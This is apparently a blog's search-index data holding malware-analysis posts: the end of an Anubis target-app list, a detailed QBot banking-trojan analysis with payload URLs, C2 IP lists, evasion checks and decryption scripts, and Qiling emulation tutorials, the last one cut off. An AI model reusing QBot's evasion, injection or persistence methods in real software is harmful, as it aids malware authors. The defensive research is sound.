uk.co.bankofscotland.businessbank   com.grppl.android.shell.BOS   com.rbs.mobile.android.natwestoffshore   com.rbs.mobile.android.natwest   com.rbs.mobile.android.natwestbandc   com.rbs.mobile.investisir   com.phyder.engage   com.rbs.mobile.android.rbs   com.rbs.mobile.android.rbsbandc   uk.co.santander.santanderUK   uk.co.santander.businessUK.bb   com.sovereign.santander   com.ifs.banking.fiid4202   com.fi6122.godough   com.rbs.mobile.android.ubr   com.htsu.hsbcpersonalbanking   com.grppl.android.shell.halifax   com.grppl.android.shell.CMBlloydsTSB73   com.barclays.android.barclaysmobilebanking   com.unionbank.ecommerce.mobile.android   com.unionbank.ecommerce.mobile.commercial.legacy   com.snapwork.IDBI   com.idbibank.abhay_card   src.com.idbi   com.idbi.mpassbook   com.ing.mobile   com.snapwork.hdfc   com.sbi.SBIFreedomPlus   hdfcbank.hdfcquickbank   com.csam.icici.bank.imobile   in.co.bankofbaroda.mpassbook   com.axis.mobile   cz.csob.smartbanking   cz.sberbankcz   sk.sporoapps.accounts   sk.sporoapps.skener   com.cleverlance.csas.servis24   org.westpac.bank   nz.co.westpac   org.westpac.banknz.co.westpac   au.com.suncorp.SuncorpBank   org.stgeorge.bank   org.banksa.bank   au.com.newcastlepermanent   au.com.nab.mobile   au.com.mebank.banking   au.com.ingdirect.android   MyING.be   com.imb.banking2   com.fusion.ATMLocator   au.com.cua.mb   com.commbank.netbank   com.cba.android.netbank   com.citibank.mobile.au   com.citibank.mobile.uk   com.citi.citimobile   org.bom.bank   com.bendigobank.mobile   me.doubledutch.hvdnz.cbnationalconference2016   au.com.bankwest.mobile   com.bankofqueensland.boq   com.anz.android.gomoney   com.anz.android   com.anz.SingaporeDigitalBanking   com.anzspot.mobile   com.crowdcompass.appSQ0QACAcYJ   com.arubanetworks.atmanz   com.quickmobile.anzirevents15   at.volksbank.volksbankmobile   it.volksbank.android   it.secservizi.mobile.atime.bpaa   de.fiducia.smartphone.android.securego.vr   com.isis_papyrus.raiffeisen_pay_eyewdg   at.easybank.mbanking   at.easybank.tablet   at.easybank.securityapp   at.bawag.mbanking   com.bawagpsk.securityapp   at.psa.app.bawag   com.pozitron.iscep   com.pozitron.vakifbank   com.starfinanz.smob.android.sfinanzstatus   com.starfinanz.mobile.android.pushtan   com.entersekt.authapp.sparkasse   com.starfinanz.smob.android.sfinanzstatus.tablet   com.starfinanz.smob.android.sbanking   com.palatine.android.mobilebanking.prod   fr.laposte.lapostemobile   fr.laposte.lapostetablet   com.cm_prod.bad   com.cm_prod.epasal   com.cm_prod_tablet.bad   com.cm_prod.nosactus   mobi.societegenerale.mobile.lappli   com.bbva.netcash   com.bbva.bbvacontigo   com.bbva.bbvawallet   es.bancosantander.apps   com.santander.app   es.cm.android   es.cm.android.tablet   com.bankia.wallet   com.jiffyondemand.user   com.latuabancaperandroid   com.latuabanca_tabperandroid   com.lynxspa.bancopopolare   com.unicredit   it.bnl.apps.banking   it.bnl.apps.enterprise.bnlpay   it.bpc.proconl.mbplus   it.copergmps.rt.pf.android.sp.bmps   it.gruppocariparma.nowbanking   it.ingdirect.app   it.nogood.container   it.popso.SCRIGNOapp   posteitaliane.posteapp.apppostepay   com.abnamro.nl.mobile.payments   com.triodos.bankingnl   nl.asnbank.asnbankieren   nl.snsbank.mobielbetalen   com.btcturk   com.ingbanktr.ingmobil   tr.com.hsbc.hsbcturkey   com.att.myWireless   com.vzw.hss.myverizon   aib.ibank.android   com.bbnt   com.csg.cs.dnmbs   com.discoverfinancial.mobile   com.eastwest.mobile   com.fi6256.godough   com.fi6543.godough   com.fi6665.godough   com.fi9228.godough   com.fi9908.godough   com.ifs.banking.fiid1369   com.ifs.mobilebanking.fiid3919   com.jackhenry.rockvillebankct   com.jackhenry.washingtontrustbankwa   com.jpm.sig.android   com.sterling.onepay   com.svb.mobilebanking   org.usemployees.mobile   pinacleMobileiPhoneApp.android   com.fuib.android.spot.online   com.ukrsibbank.client.android   ru.alfabank.mobile.ua.android   ua.aval.dbo.client.android   ua.com.cs.ifobs.mobile.android.otp   ua.com.cs.ifobs.mobile.android.pivd   ua.oschadbank.online   ua.privatbank.ap24   com.Plus500   com.Plus500(Crypt)+   eu.unicreditgroup.hvbapptan   com.targo_prod.bad   com.db.pwcc.dbmobile   com.db.mm.norisbank   com.bitmarket.trader   com.bitmarket.trader(Crypt)+   com.plunien.poloniex   com.plunien.poloniex(Crypt)+   com.mycelium.wallet   com.mycelium.wallet(Crypt)+   com.bitfinex.bfxapp   com.bitfinex.bfxapp(Crypt)+   com.binance.dev   com.binance.dev(Crypt)+   com.btcturk(Crypt)   com.binance.odapplications   com.binance.odapplications(Crypt)   com.blockfolio.blockfolio   com.blockfolio.blockfolio(Crypt)   com.crypter.cryptocyrrency   com.crypter.cryptocyrrency(Crypt)   io.getdelta.android   io.getdelta.android(Crypt)   com.edsoftapps.mycoinsvalue   com.edsoftapps.mycoinsvalue(Crypt)   com.coin.profit   com.coin.profit(Crypt)   com.mal.saul.coinmarketcap   com.mal.saul.coinmarketcap(Crypt)   com.tnx.apps.coinportfolio   com.tnx.apps.coinportfolio(Crypt)   com.coinbase.android   com.coinbase.android(Crypt)+   com.portfolio.coinbase_tracker   com.portfolio.coinbase_tracker(Crypt)+   de.schildbach.wallet   de.schildbach.wallet(Crypt)   piuk.blockchain.android   piuk.blockchain.android(Crypt)+   info.blockchain.merchant   info.blockchain.merchant(Crypt)+   com.jackpf.blockchainsearch   com.jackpf.blockchainsearch(Crypt)   com.unocoin.unocoinwallet   com.unocoin.unocoinwallet(Crypt)+   com.unocoin.unocoinmerchantPoS   com.unocoin.unocoinmerchantPoS(Crypt)+   com.thunkable.android.santoshmehta364.UNOCOIN_LIVE   com.thunkable.android.santoshmehta364.UNOCOIN_LIVE(Crypt)   wos.com.zebpay   wos.com.zebpay(Crypt)+   com.localbitcoinsmbapp   com.localbitcoinsmbapp(Crypt)+   com.thunkable.android.manirana54.LocalBitCoins   com.thunkable.android.manirana54.LocalBitCoins(Crypt)+   com.thunkable.android.manirana54.LocalBitCoins_unblock   com.thunkable.android.manirana54.LocalBitCoins_unblock(Crypt)+   com.localbitcoins.exchange   com.localbitcoins.exchange(Crypt)+   com.coins.bit.local   com.coins.bit.local(Crypt)+   com.coins.ful.bit   com.coins.ful.bit(Crypt)+   com.jamalabbasii1998.localbitcoin   com.jamalabbasii1998.localbitcoin(Crypt)+   zebpay.Application   zebpay.Application(Crypt)+   com.bitcoin.ss.zebpayindia   com.bitcoin.ss.zebpayindia(Crypt)   com.kryptokit.jaxx   com.kryptokit.jaxx(Crypt)   References   https://info.phishlabs.com/blog/bankbot-anubis-telegram-chinese-c2   https://blog.trendmicro.com/trendlabs-security-intelligence/anubis-android-malware-returns-with-over-17000-samples/   https://eybisi.run/Mobile-Malware-Analysis-Tricks-used-in-Anubis  ","categories": ["Malware Analysis"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/malware%20analysis/anubis-banking-malware/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/malware-analysis/anubis-banking-malware/logo.png"
      },{
        "title": "Deep Analysis of QBot Banking Trojan",
        "excerpt":"QBot is a modular information stealer also known as Qakbot or Pinkslipbot. It has been active for years since 2007. It has historically been known as a banking Trojan, meaning that it steals financial data from infected systems.   Infection Flow   QBot can be delivered in various different ways including Malspam (Malicious Spam) or dropped by other malware families like Emotet.   The infection flow for this campaign is as follows:      First, the victim receives a phishing email with a link to a malicious zip file.      The zip file contains a very obfuscated VBS file which downloads and launches Qbot executable.      The VBS file tries to download Qbot from different places:      http://st29[.]ru/tbzirttmcnmb/88888888.png   http://restaurantbrighton[.]ru/uyqcb/88888888.png   http://royalapartments[.]pl/vtjwwoqxaix/88888888.png   http://alergeny.dietapacjenta[.]pl/pgaakzs/88888888.png   http://egyorg[.]com/vxvipjfembb/88888888.png   Notice the misleading URL, it looks like it’s downloading a PNG image but the raw data says something else.   Unpacking   QBot is packed with a custom packer, but the unpacking process is really simple. It allocates memory for the unpacked code using VirtualAlloc() and changes memory protection using VirtualProtect(). So we just need 2 breakpoints at  VirtualAlloc()  and  VirtualProtect().      Encrypted Strings   Most of QBot strings are encrypted (stored in a continuous blob) and they are decrypted on demand. The decryption routine accepts one argument which is the  index to the string then it XORs it with a hardcoded bytes array until it encounters a null byte.   We can use IDAPython to decrypt the strings and add them as comments.   import idc import idautils  dec_routine = 0x4065B7 enc_strings = 0x40B930 bytes_arr = 0x410120  def decrypt_string(idx):     if idx &gt;= 0x36F4:         return    # out of bounds     res = \"\"     while True:         c = idc.get_wide_byte(enc_strings+idx) ^ idc.get_wide_byte(bytes_arr + (idx&amp;0x3F))         if c == 0: break         res += chr(c)         idx += 1     return res  xrefs = idautils.CodeRefsTo(dec_routine, 0) for x in xrefs:     ea = idc.prev_head(x)     t = idc.get_operand_type(ea, 1)     if t == idc.o_imm:         idx = idc.get_operand_value(ea, 1)         dec = decrypt_string(idx)         idc.set_cmt(ea, dec, 1)   And here is the result, that’s much easier to work with.      This should take care of most of the strings, the rest of strings indexes are calculated dynamically at runtime.   We decrypt all strings by looping through the encrypted blob and decrypt strings one by one.   idx = 0 while idx &lt; 0x36F4:     dec = decrypt_string(idx)     idx += len(dec)+1     print(dec)   Anti-Analysis   QBot spawns a new process of itself with the  \"/C\" parameter, this process is responsible for doing Anti-Analysis checks.      The parent process checks the exit code of this spawned process. If the exit code is not 0, it means that QBot is being analyzed (and so it exits).      So let’s go over the anti-analysis techniques.   Checking VM   In VMWare, communication with the host is done through a specific I/O  port (0x5658), so QBot uses the in assembly instruction to detect VMWare by reading from this port and checking the return value in ebx if it’s equal to VMXh (VMware magic value).   If we are outside VMWare, a privilege error occurs and this code will return 0.      Another Anti-VM trick is to check hardware devices against known devices names used by VMs and Sandboxes.   Here is the list of devices names.                              Expand to see more            &emsp; VMware Pointing  &emsp; VMware Accelerated  &emsp; VMware SCSI  &emsp; VMware SVGA  &emsp; VMware Replay  &emsp; VMware server memory   &emsp; CWSandbox  &emsp; Virtual HD  &emsp; QEMU  &emsp; Red Hat VirtIO  &emsp; srootkit  &emsp; VMware VMaudio  &emsp; VMware Vista  &emsp; VBoxVideo  &emsp; VBoxGuest  &emsp; vmxnet  &emsp; vmscsi  &emsp; VMAUDIO  &emsp; vmdebug  &emsp; vm3dmp  &emsp; vmrawdsk  &emsp; vmx_svga  &emsp; ansfltr  &emsp; sbtisht    Checking Processes   QBot loops through running processes and compares their executable names against known analysis tools.                              Expand to see more            &emsp; Fiddler.exe  &emsp; samp1e.exe  &emsp; sample.exe  &emsp; runsample.exe  &emsp; lordpe.exe  &emsp; regshot.exe   &emsp; Autoruns.exe  &emsp; dsniff.exe  &emsp; VBoxTray.exe  &emsp; HashMyFiles.exe  &emsp; ProcessHacker.exe  &emsp; Procmon.exe  &emsp; Procmon64.exe  &emsp; netmon.exe  &emsp; vmtoolsd.exe  &emsp; vm3dservice.exe  &emsp; VGAuthService.exe  &emsp; pr0c3xp.exe  &emsp; CFF Explorer.exe  &emsp; dumpcap.exe  &emsp; Wireshark.exe  &emsp; idaq.exe  &emsp; idaq64.exe  &emsp; TPAutoConnect.exe  &emsp; ResourceHacker.exe  &emsp; vmacthlp.exe  &emsp; OLLYDBG.EXE  &emsp; windbg.exe  &emsp; bds-vision-agent-nai.exe  &emsp; bds-vision-apis.exe  &emsp; bds-vision-agent-app.exe  &emsp; MultiAnalysis_v1.0.294.exe  &emsp; x32dbg.exe  &emsp; VBoxService.exe  &emsp; Tcpview.exe    Checking DLLs   Sandbox detection can be done by enumerating loaded DLLs and comparing them against known DLLs used by sandboxes. Here it’s just using 2 of them.   ivm-inject.dll     # Buster Sandbox Analyzer SbieDll.dll        # SandBoxie   Checking Filename   Some sandboxes may change the sample file name. So QBot checks if its process name contains one of these strings.   sample mlwr_smpl artifact.exe   Checking CPU   The last check is done using CPUID instruction. First it is executed with EAX=0 to get the CPU vendor and compares it with GenuineIntel (Intel processor).   Then it is executed with EAX=1 to get the processors features.   On a physical machine the last bit will be equal to 0. On a guest VM it will equal to 1.      Back To Parent   After the Anti-Analysis checks, QBot drops a copy of itself along with a configuration file at \"%APPDATA%\\Microsoft\\&lt;random_folder_name&gt;\".      Finally, QBot starts the dropped copy in a new process and overwrites itself with a legitimate executable, here it’s  \"calc.exe\".      Configuration File   The dropped configuration file is accessed frequently by Qbot, this file is RC4 encrypted. By setting a breakpoint before the contents of the file gets encrypted I got the following data:                  Field       Description                       10=spx143       Campaign ID                 11=2       Number of hardcoded C2                 1=13.59.00-24/06/2020       Date of Qbot install in HH:MM:ss-dd/mm/yyyy                 2=1592996340       Victim Qbot install                 50=1       N/A                 5=VgBCAE8AWABTAFYAUgA7ADIA       Victim network shares                 38=1593047244       Last victim call to C2 (Unix time)                 45=187.163.101.137       C2 IP                 46=995       C2 port                 39=45.242.76.104       Victim external IP                 43=1593006172       Time of record (Unix time)                 49=1       N/A           Persistence   QBot achieves persistence by creating a new registry value under the key \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\". It also registers a scheduled task that runs every 5 hours.      Process Injection   QBot tries to inject its unpacked code in one of these processes (\"explorer.exe\", \"mobsync.exe\", \"iexplorer.exe\") and it uses Process Hollowing technique to achieve that.   It first starts a new suspended process with CreateProcessW() then it writes the injected code into the target process using ZwCreateSection(), ZwMapViewOfSection() and ZwWriteVirtualMemory().   Finally it sets the thread context to jump to the injected code and resume execution with ResumeThread().   Core Module   The injected code loads and decrypts one of its resources  \"307\" . After dumping it, I found out that it’s a DLL (this is the core module).      From now on, we will be analyzing the core DLL of QBot.   The core module has 2 resources both RC4 encrypted.      The first resource gets loaded into memory then RC4 decrypted.      The contents of the decrypted resource are:           10=spx143 (Campaign ID)            3=1592482956 (Timestamp)       After some digging, I found out how the resources are decrypted. The first 20 bytes of each resource are the RC4 key of this resource, and the rest are the actual encrypted data.   So by using this find, we can decrypt the other resource \"311\".      Great!!! Now we have the list of C2 servers (150 servers!).   The reason there is many controllers is that these are actually just proxies of infected bots acting as intermediate nodes between the victim and the real C2 and thus hiding the backend infrastructure of the attacker.   So it works like this:      C2 Communication   QBot obfuscates its communication with the C2 server by encrypting the payloads using RC4 and encoding the result using Base64.   The communication is also done over SSL, you can notice that the traffic has unusual certificate issuer data.      We can use Fiddler to intercept and decrypt the HTTPS traffic.      The RC4 key for encrypting the payload is the SHA1 hash of the first 16 bytes of the Base64-decoded payload + a hardcoded salt (The salt is stored as an encrypted string).   Here is an implementation of the decryption algorithm:   HARDCODED_SALT = b\"jHxastDcds)oMc=jvh7wdUhxcsdt2\"    # decrypted string  def decrypt_payload(encrypted_blob):     b64_decoded = base64.b64decode(encrypted_blob)     decryption_key = b64_decoded[:0x10] + HARDCODED_SALT     sha1hash = hashlib.sha1()     sha1hash.update(decryption_key)     decryption_key_hash = sha1hash.digest()     rc4 = ARC4(decryption_key_hash)     return rc4.decrypt(b64_decoded[0x10:])   The decrypted payload is in JSON form.      Decrypted C2 Request: {“8”:9,”1”:17,”2”:”pnmfcq111232”}   Decrypted C2 Response: {“8”:5,”16”:770897804,”39”:”V4UnoDQSEblewhh63UfUqAns”,”38”:1}   Commands List   After establishing communication, the C2 server will send commands indexes to be executed.   Here is the list of commands and their corresponding indexes (I have renamed the important commands).      It’s worth mentioning that dynamic imports of the core DLL are stored in the same format as commands \"&lt;address, API_index, DLL_index&gt;\", the API and DLL indexes are passed to the string decryption routine which returns their corresponding names then it uses LoadLibrary and GetProcAddress to resolve the imports.      Let’s go through some of the interesting commands.   Command 13: Lateral Movement   QBot can spread through the network by enumerating network shares using WNetOpenEnumW() and WNetEnumResourceW() then it drops a copy of Qbot into the shared folders.   Then the dropped executable is registered as an auto-start service on the target machine. The names for the service and the dropped file are randomly generated strings.      Finally, Qbot deletes the created service and dropped file from the target machine (as it’s successfully infected).   Command 21: Collecting Installed Applications   QBot can collect installed applications by enumeration subkeys of the registry key \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\".      The collected data is appended to the end of a string containing additional information about the victim’s machine and time of collection.   t=i1 time=[&lt;time_of_collect&gt;] ext_ip=[&lt;external_IP&gt;] dnsname=[?] hostname=[&lt;computer_name&gt;] user=[] domain=[] is_admin=[&lt;YES/NO&gt;] os=[&lt;windows_ver&gt;] qbot_version=[&lt;qbot_ver&gt;] install_time=[&lt;qbot_install_time&gt;] exe=[&lt;injected_process&gt;] prod_id=[NULL] iface_n=[&lt;interface_IP&gt;/&lt;interface_IP&gt;] UP] soft=[&lt;app1;ver&gt;|&lt;app2;ver&gt;|...]   Example of collected data:      Then the data is RC4 encrypted and written to \"wdqlxw32.dll\" at the same directory of QBot.   Finally, \"wdqlxw32.dll\" is Zlib compressed and RC4 encrypted again then it’s saved to \"cwdqlxw32.dll\" and the original \"wdqlxw32.dll\" is deleted.      The compressed file is then transfered to the C2 server (RC4 encrypted and Base64 encoded) in the key \"36\" and the compressed file \"cwdqlxw32.dll\" is also deleted.      Command 31: Fetching Plugins   As we said before, QBot is known to be a modular malware. It can load additional plugins received from the C2 server (plugins are RC4 encrypted and Base64 encoded).   QBot tries to inject the received plugin in 3 different processes depending on the machine architecture.      It creates a new suspended process then writes the plugin to the process memory using WriteProcessMemory() and then resumes the injected process.      At the time of writing this, Qbot has 3 different plugins (“Password grabber”, “Cookie grabber”, “UPnP module”).   Conclusion   QBot is considered to be a sophisticated malware, it’s receiving regular updates from time to time and it’s not likely to go away anytime soon.   There is still more features that I didn’t cover such as WebInjects so maybe I will come back to Qbot later I guess :)   IOCs   Hashes   VBS File: b734caf792c968ca1870c3ec7dda68ad5dc47fef548751afb8509752c185a756   QBot: 112a64190b9a0f356880eebf05e195f4c16407032bf89fa843fd136da6f5d515   URLs   http://st29[.]ru/tbzirttmcnmb/88888888.png   http://restaurantbrighton[.]ru/uyqcb/88888888.png   http://royalapartments[.]pl/vtjwwoqxaix/88888888.png   http://alergeny.dietapacjenta[.]pl/pgaakzs/88888888.png   http://egyorg[.]com/vxvipjfembb/88888888.png   C2 Domains   39.36.254.179:995   24.139.132.70:443   24.202.42.48:2222   72.204.242.138:443   172.242.156.50:995   72.204.242.138:20   68.174.15.223:443   74.193.197.246:443   96.56.237.174:990   64.19.74.29:995   70.168.130.172:443   189.236.166.167:443   68.4.137.211:443   76.187.8.160:443   76.86.57.179:2222   73.226.220.56:443   67.250.184.157:443   75.183.171.155:3389   173.172.205.216:443   173.3.132.17:995   172.78.30.215:443   207.255.161.8:32103   75.137.239.211:443   68.49.120.179:443   206.51.202.106:50003   82.127.193.151:2222   207.255.161.8:2222   207.255.161.8:2087   24.152.219.253:995   187.19.151.218:995   197.37.48.37:993   188.241.243.175:443   72.88.119.131:443   89.137.211.239:443   108.30.125.94:443   187.163.101.137:995   100.19.7.242:443   45.77.164.175:443   80.240.26.178:443   66.208.105.6:443   207.246.75.201:443   199.247.22.145:443   199.247.16.80:443   95.77.223.148:443   68.60.221.169:465   5.107.220.84:2222   41.228.212.22:443   86.233.4.153:2222   68.200.23.189:443   201.146.127.158:443   79.114.199.39:443   87.65.204.240:995   71.74.12.34:443   217.162.149.212:443   195.162.106.93:2222   75.165.112.82:50002   201.248.102.4:2078   96.41.93.96:443   89.247.216.127:443   84.232.238.30:443   103.238.231.40:443   174.34.67.106:2222   98.115.138.61:443   91.125.21.16:2222   84.247.55.190:443   193.248.44.2:2222   74.135.37.79:443   78.96.190.54:443   86.126.97.183:2222   2.50.47.97:2222   68.39.160.40:443   96.232.203.15:443   86.144.150.29:2222   71.220.191.200:443   24.231.54.185:2222   80.14.209.42:2222   24.164.79.147:443   70.183.127.6:995   47.153.115.154:993   184.180.157.203:2222   50.104.68.223:443   67.165.206.193:995   200.113.201.83:993   47.153.115.154:465   24.42.14.241:995   189.160.203.110:443   188.27.76.139:443   207.255.161.8:32102   49.207.105.25:443   71.210.177.4:443   117.242.253.163:443   50.244.112.106:443   69.92.54.95:995   41.34.91.90:995   72.204.242.138:53   41.97.138.74:443   72.29.181.77:2078   71.88.168.176:443   2.50.171.142:443   67.83.54.76:2222   86.125.145.90:2222   47.153.115.154:995   24.122.157.93:443   47.146.169.85:443   72.181.9.163:443   187.155.74.5:443   71.209.187.4:443   74.75.216.202:443   24.44.180.236:2222   24.43.22.220:993   108.188.116.179:443   100.4.173.223:443   76.170.77.99:443   70.95.118.217:443   134.0.196.46:995   68.225.56.31:443   72.204.242.138:32102   72.204.242.138:50001   108.190.151.108:2222   72.204.242.138:465   50.244.112.10:443   173.22.120.11:2222   24.43.22.220:995   24.43.22.220:443   92.17.167.87:2222   72.209.191.27:443   72.204.242.138:80   72.204.242.138:443   71.187.170.235:443   96.56.237.174:32103   71.187.7.239:443   184.98.104.7:995   70.124.29.226:443   137.99.224.198:443   73.23.194.75:443   151.205.102.42:443   64.224.76.152:443   72.204.242.138:32100   173.187.101.221:443   72.179.13.59:443   208.93.202.49:443   70.174.3.241:443   96.37.137.42:443   76.111.128.194:443   67.209.195.198:3389   61.3.184.27:443   24.42.14.241:443   74.56.167.31:443   5.193.61.212:2222   117.216.177.171:443   References   Demystifying QBot Banking Trojan - BSides Belfast   https://www.virusbulletin.com/virusbulletin/2017/06/vb2016-paper-diving-pinkslipbots-latest-campaign   https://www.fortinet.com/blog/threat-research/deep-analysis-qbot-campaign   https://www.vkremez.com/2018/07/lets-learn-in-depth-reversing-of-qakbot.html   https://www.hexacorn.com/blog/2016/07/01/enter-sandbox-part-12-the-library-of-naughty-libraries/   https://www.cyberbit.com/blog/endpoint-security/anti-vm-and-anti-sandbox-explained/  ","categories": ["Malware Analysis"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/malware%20analysis/qbot-banking-trojan/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/malware-analysis/qbot-banking-trojan/logo.png"
      },{
        "title": "Qiling For Malware Analysis: Part 1",
        "excerpt":"Background   Qiling is an advanced binary emulation framework written in python and based on Unicorn engine.   It supports multiple platform (Windows, MacOS, Linux, BSD, UEFI) and multiple architectures (X86, X86_64, Arm, Arm64, MIPS).   Qiling is designed as a higher level framework, that leverages Unicorn  to emulate CPU instructions, but Qiling understands OS as it has executable format loaders (for PE, MachO &amp; ELF at the moment), dynamic linkers (so we can load &amp; relocate shared libraries), syscall &amp; IO handlers. For this reason, Qiling can run executable binaries that normally runs in native OS.   Installation   Due to distribution restrictions, Qiling doesn’t bundle Microsoft Windows DLL files and registry.   So for smooth installation, jump to a 64-bit windows machine and execute the following:   git clone https://github.com/qilingframework/qiling cd qiling examples\\scripts\\dllscollector.bat        # DLLs collector (requires admin privileges)   Sometimes the emulated program requires additional DLLs, you can copy them manually to \"qiling/examples/rootfs/x8664_windows/Windows/System32\" or \"qiling/examples/rootfs/x86_windows/Windows/SysWOW64/\" depending on the program architecture.   Now you can copy \"qiling\" folder to any machine you want (Windows, Linux, …) and complete the installation.   pip3 install -r requirements.txt    # sudo for Linux python3 setup.py install            # sudo for Linux   Emulating a File   Emulating a binary file is as simple as that:   from qiling import *  # initialize emulator (x86-64 linux) ql = Qiling(filename=[\"qiling/examples/rootfs/x8664_linux/bin/x8664_hello\"],              rootfs=\"qiling/examples/rootfs/x8664_linux\") # start emulation ql.run()   Qiling initialization constructor can take multiple arguments:           filename: binary file and its arguments, example: filename=[“test”,”-argv1”,”argv2”]            rootfs: virtual “/” folder, this is a “jail” file system when executing Qiling (target architecture)            env: environment variables, example: env={“SHELL”:”/bin/bash”,”HOME”:”/tmp”}            output: “default”, “debug”, “disasm”, “dump” where dump=(disam + debug)       The run() function can also take multiple arguments:      begin: start address of emulated code   end: end address of emulated code   timeout: emulation timeout (in microseconds)   count: maximum instruction count to be emulated   Now let’s run our first script:   ........ brk(0x0) brk(0x555555779000) write(1,555555758260,14) = 0 Hello, World!   As you can see, Qiling outputs strace logs by default. You can disable them using filters.   # disable strace logs ql.filter = [] # display only \"open\" logs ql.filter = [\"open\"]   Emulating a Shellcode   To keep things simple, we will use this tiny shellcode:   shellcode = b\"\\x41\\x4a\" # inc ecx; dec edx   Next, let’s initialize Qiling.   # initialize emulator (x86 linux) ql = Qiling(shellcoder=shellcode,              rootfs=\"qiling/examples/rootfs/x86_linux/\",             ostype=\"linux\",             archtype=\"x86\",             output=\"disasm\")   Emulating shellcode is a little different than binary files, the initialization constructor takes additional arguments:      shellcoder: shellcode in binary format        rootfs: explained above            env: explained above            ostype: “linux”, “macos”, “windows”, “uefi”, “freebsd”            archtype: “x8664”, “x86”, “arm”, “arm64”, “mips”       output: explained above   Here we set the output to \"disasm\" to see the executed instructions.   The shellcode modifies the values of ECX and EDX registers, so let’s write some values to them before emulating.   # set machine registers ql.reg.ecx = 0x3 ql.reg.edx = 0x7 # start emulation ql.run() # read machine registers print(\"ecx = 0x{:x}\".format(ql.reg.ecx)) print(\"edx = 0x{:x}\".format(ql.reg.edx))   Let’s see the results:   [+] 0x11ff000      41          inc ecx [+] 0x11ff001      4a          dec edx ecx = 0x4 edx = 0x6   Hooking   Qiling supports a wide range of hooks such as hooking specific instructions and hooking memory read/write actions.   Let’s implement a basic disassembler with the help of Capstone and Qiling hooks.   Capstone is a multi-architecture disassembly framework, we can setup a code hook using Qiling to hook every instruction then use Capstone to disassemble the instructions.   from capstone import * from qiling import *  # initialize emulator (x86 ARM) ql = Qiling([\"qiling/examples/rootfs/arm_linux/bin/arm_hello\"],              \"qiling/examples/rootfs/arm_linux\") # hook every instruction ql.hook_code(hook_callback) # start emulation (timeout in microseconds) ql.run(timeout=1000)   We can add a code hook by simply calling hook_code() with a callback function.   def hook_callback(ql, address, size):     # read current instruction bytes     data = ql.mem.read(address, size)     # initialize Capstone     md = Cs(CS_ARCH_ARM, CS_MODE_ARM)     # disassemble current instruction     for i in md.disasm(data, address):         print(\"[*] 0x{:08x}: {} {}\".format(i.address, i.mnemonic, i.op_str))   The callback function takes three arguments:      ql: our emulator object   address: the address of the current instruction   size: the size of the instruction in bytes   We can disassemble the current instruction using disasm() which takes two arguments (data to disassemble and a base address), here we are printing the instruction address, instruction mnemonic and instruction operands.   Let’s see the results:   [*] 0x047ba9e0: ldr sl, [pc, #0x94] [*] 0x047ba9e4: ldr r4, [pc, #0x94] [*] 0x047ba9e8: mov r0, sp [*] 0x047ba9ec: bl #0x47bb154 [*] 0x0001030c: mov fp, #0 [*] 0x00010310: mov lr, #0 [*] 0x00010314: pop {r1} ..........   Conclusion   In this part we learned the basics of Qiling and how to emulate code for different architectures.   I really encourage you to read through Qiling Documentation to learn more about it’s amazing capabilities.   Code snippets can be found on my Github.  ","categories": ["Tutorials"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/tutorials/qiling-for-malware-analysis-part-1/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/tutorials/qiling/logo.png"
      },{
        "title": "Qiling For Malware Analysis: Part 2",
        "excerpt":"In the first part we talked about the basics of Qiling, you can find it here.   Now it’s time for some real world stuff, we will go through two scenarios where Qiling shines.   Fetching KSLØT Dynamic Imports   Dynamic Imports or Dynamic API resolving is a common technique used by many malware samples to make static analysis harder. Instead of importing all needed APIs, the malware can store the APIs names or hashes then import them dynamically at runtime.   The most common way to do this is by using LoadLibrary() and GetProcAddress(), and that’s what we are KSLØT uses.   According to MSDN, the second argument toGetProcAddress() is the function name (\"lpProcName\"). So we can hook GetProcAddress() and dump the second argument each time it’s called.   Now you might be thinking, why don’t we just use a debugger and trace the execution flow of the malware ?   I can think of three problems about that approach:      The malware might be implementing Anti-Debugging/Anti-Analysis tricks to waste your time   The malware might run on a different architecture that you don’t have access to.   You might want to automate the whole process (Scalability)   Let’s start writing the script.   from qiling import * from qiling.const import *  # initialize emulator (x86_64 windows) ql = Qiling([\"kSLØT_Keylogger.dll\"], \"qiling/examples/rootfs/x8664_windows\")   The malware sample used here is distributed as a DLL file.   Similar to the main function in typical executables, DLLs have their DllMain function that is executed automatically when they are loaded into memory.   BOOL WINAPI DllMain(     HINSTANCE hinstDLL,  // handle to DLL module     DWORD fdwReason,     // reason for calling function     LPVOID lpReserved    // reserved )   As we can see, the function takes 3 arguments. The first one (hinstDLL) is a handle to the memory area where the DLL has been loaded. The second one stores a value that indicates the reason why the DllMain has been triggered. Read more here.   So to emulate the DLL properly, we need to set these arguments first (for x64 calling convention, paramerts are passed in RCX, RDX, R8, R9).   DLL_MAIN = 0x1800019a0     # Adress of DLLMain function # hinstDLL ql.reg.rcx = 0x180000000   # Address where Qiling loads the DLL # fdwReason ql.reg.rdx = 0x1           # DLL_PROCESS_DETACH # lpvReserved ql.reg.r8 = 0x0   Next, we can use set_api() function to hook GetProcAddress() on exit.   #FARPROC GetProcAddress( #  HMODULE hModule, #  LPCSTR  lpProcName #) def hook_GetProcAddress(ql, addr, params):     print(\"[*] Import: {}\".format(params[\"lpProcName\"]))  # hook GetProcAddress() on exit ql.set_api(\"GetProcAddress\", hook_GetProcAddress, QL_INTERCEPT.EXIT)  # disable logging ql.filter = [] # start emulation ql.run(begin=DLL_MAIN)   Let’s see the results:   [+] Initiate stack address at 0x7ffffffde000  [+] Loading kSLØT_Keylogger.dll to 0x180000000 [+] PE entry point at 0x180006118 [+] TEB addr is 0x6030 [+] PEB addr is 0x60b8 [+] Loading qiling/examples/rootfs/x8664_windows/Windows/System32/ntdll.dll to 0x7ffff0000000 [+] Done with loading qiling/examples/rootfs/x8664_windows/Windows/System32/ntdll.dll [+] Loading qiling/examples/rootfs/x8664_windows/Windows/System32/kernel32.dll to 0x7ffff01e1000 